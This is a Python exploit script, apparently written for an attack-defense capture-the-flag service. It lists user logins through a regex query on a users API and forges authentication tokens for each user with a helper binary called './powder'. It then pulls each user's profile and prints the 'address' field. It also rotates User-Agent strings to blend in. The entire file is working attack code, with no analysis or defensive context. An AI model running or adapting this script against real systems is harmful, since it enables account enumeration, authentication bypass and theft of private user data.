#!/usr/bin/env python3
import requests
import subprocess
import sys
import random
import string

USER_AGENTS = ['Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
               'Mozilla/5.0 (X11; Linux i686; rv:30.0) Gecko/20100101 Firefox/30.0',
               'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
               'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.39 (KHTML, like Gecko) Version/9.0 Safari/601.1.39']


def get_random_creds():
    return (
        ''.join(random.sample(string.ascii_lowercase + string.ascii_lowercase + string.digits, 8)),
        ''.join(random.sample(string.ascii_lowercase + string.ascii_lowercase + string.digits, 8))
    )

def get_random_ua():
    return random.choice(USER_AGENTS)

class Exploiter(requests.Session):
    def __init__(self, host, port):
        super().__init__()
        self.headers = {
            'User-Agent': get_random_ua()
        }
        self._creds = get_random_creds()

        self._base = 'http://{}:{}'.format(host, port)

    def u(self, a):
        return self._base + a

    def get_users(self):
        r = requests.get(self.u('/api/v1/users'), params={
            're': r'.+-.+-.+'
        })
        users = r.json()

        if users['error']:
            #print("Error get_users", file=sys.stderr)
            return []
        
        return [u['login'] for u in users['users']]

    def get_address(self, user):
        # print("testing", user)
        token = subprocess.check_output(['./powder', user]).decode().strip()
        # print("token", token)
        
        r = requests.get(self.u('/api/v1/user/profile'), headers={
            'token': token.strip()
        })
        profile = r.json()

        if profile['error']:
            #print("Error get_address", profile, file=sys.stderr)
            return []

        print(profile.get('address', 'no address??'))

    def exploit(self):
        for user in self.get_users():
            self.get_address(user)

def main():
    host, port = sys.argv[1:3]
    ex = Exploiter(host, port)
    ex.exploit()

if __name__ == '__main__':
    main()
